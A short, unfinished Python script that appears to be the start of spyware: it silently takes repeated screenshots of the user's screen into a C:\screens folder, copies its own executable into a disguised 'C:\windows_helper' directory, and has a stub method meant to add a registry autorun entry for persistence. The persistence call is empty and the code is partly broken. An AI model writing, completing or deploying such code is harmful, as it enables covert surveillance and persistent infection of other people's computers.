import pyautogui
import time
import os
import shutil
import sys

os.mkdir("C:\screens")
path = os.path.abspath(sys.argv[0])



def make_screens():
    x = 1
    while x<4:
        pyautogui.screenshot('C:\screens\image'+str(x)+'.png')
        x+=1
        time.sleep(2)
        print("screenshot" + str(x))



class save_payload_anyware_else():

    def __init__(self, payload_storage_location, payload):
        self.payload_storage_location = payload_storage_location
        self.payload = payload

    def copy_this_payload(self):
        path_to_copy = "C:\windows_helper"
        os.mkdir(path_to_copy)
        shutil.copy(path, path_to_copy)
        
    def put_in_regit_for_autorun(self):
        os.system()
